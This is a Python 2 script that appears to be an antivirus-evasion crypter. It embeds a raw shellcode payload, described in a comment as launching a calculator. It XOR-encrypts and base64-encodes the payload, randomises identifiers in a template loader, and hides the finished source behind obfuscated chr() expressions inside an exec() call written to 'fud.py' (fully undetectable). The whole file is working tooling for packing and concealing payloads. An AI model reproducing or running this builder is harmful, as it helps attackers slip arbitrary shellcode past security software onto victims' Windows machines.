import hashlib
import base64
import string
import itertools
import ctypes
import random
import re

uniques = []

exceptThose = [
    '[GEOBJECT]',
    '[HL]',
    '[bed]',
    '[stst]',
    '[itools]',
    '[CRYPTED]',
    '[MD5SUM]',
]

charset = string.ascii_lowercase+string.ascii_uppercase
keycharset = string.digits+string.ascii_lowercase+string.ascii_uppercase

def getRandomString():
    return ''.join(random.choice(charset) for x in range(random.randint(3, 40)))

getobjectvar = getRandomString()
hl = getRandomString()
bed = getRandomString()
stst = getRandomString()
itools = getRandomString()

# DISCLAIMER: This is a calculator shellcode.
# DO NOT USE IT if you are suspicious.
payload = "\xbf\x88\xa9\x98\x92\xd9\xc3\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x31\x83\xe8\xfc\x31\x78\x0f\x03\x78\x87\x4b\x6d\x6e\x7f\x09\x8e\x8f\x7f\x6e\x06\x6a\x4e\xae\x7c\xfe\xe0\x1e\xf6\x52\x0c\xd4\x5a\x47\x87\x98\x72\x68\x20\x16\xa5\x47\xb1\x0b\x95\xc6\x31\x56\xca\x28\x08\x99\x1f\x28\x4d\xc4\xd2\x78\x06\x82\x41\x6d\x23\xde\x59\x06\x7f\xce\xd9\xfb\x37\xf1\xc8\xad\x4c\xa8\xca\x4c\x81\xc0\x42\x57\xc6\xed\x1d\xec\x3c\x99\x9f\x24\x0d\x62\x33\x09\xa2\x91\x4d\x4d\x04\x4a\x38\xa7\x77\xf7\x3b\x7c\x0a\x23\xc9\x67\xac\xa0\x69\x4c\x4d\x64\xef\x07\x41\xc1\x7b\x4f\x45\xd4\xa8\xfb\x71\x5d\x4f\x2c\xf0\x25\x74\xe8\x59\xfd\x15\xa9\x07\x50\x29\xa9\xe8\x0d\x8f\xa1\x04\x59\xa2\xeb\x42\x9c\x30\x96\x20\x9e\x4a\x99\x14\xf7\x7b\x12\xfb\x80\x83\xf1\xb8\x7f\xce\x58\xe8\x17\x97\x08\xa9\x75\x28\xe7\xed\x83\xab\x02\x8d\x77\xb3\x66\x88\x3c\x73\x9a\xe0\x2d\x16\x9c\x57\x4d\x33\xff\x36\xdd\xdf\x2e\xdd\x65\x45\x2f"

with open('template.py', 'r') as template:
    source = template.read()
    search_results = re.finditer(r'\[.*?\]', source)
    for item in search_results:
        if item.group(0) not in exceptThose and item.group(0) not in uniques:
            uniques.append(item.group(0))

def Obfuscate(body):
    obfuscated = ""
    for i in range(0, len(body)):
        if obfuscated == "":
            obfuscated += expr(ord(body[i]))
        else:
            obfuscated += "+" + expr(ord(body[i]))
    return obfuscated

def expr(char):
    range = random.randrange(1,10001)
    exp = random.randrange(0,3)
    if exp == 0:
        return "chr(" + str((range+char)) + "-" + str(range) + ")"
    elif exp == 1:
        return "chr(" + str((char-range)) + "+" + str(range) + ")"
    elif exp == 2:
        return "chr(" + str((char*range)) + "/" + str(range) + ")"

def xor(message, key):
    toret = ''
    for c, k in itertools.izip(message, itertools.cycle(key)):
        toret += chr(ord(c) ^ ord(k))
    return toret

randomKey = ''.join(random.choice(keycharset) for x in range(3))
md5sum = hashlib.md5(payload).hexdigest().upper()
encrypted = base64.encodestring(xor(payload, randomKey)).replace('\n', '')

source = source.replace('[CRYPTED]', encrypted)
source = source.replace('[MD5SUM]', md5sum)

for z in uniques:
    source = source.replace(z, getRandomString())

source = source.replace('[GEOBJECT]', getobjectvar)
source = source.replace('[HL]', hl)
source = source.replace('[bed]', bed)
source = source.replace('[stst]', stst)
source = source.replace('[itools]', itools)

with open('fud.py', 'w') as final:
    final.write('from ctypes import *\n')
    final.write('from win32com.client import GetObject as %s\n' % getobjectvar)
    final.write('import hashlib as %s\n' % hl)
    final.write('import base64 as %s\n' % bed)
    final.write('import string as %s\n' % stst)
    final.write('import itertools as %s\n' % itools)
    final.write("exec("+Obfuscate(source)+")")
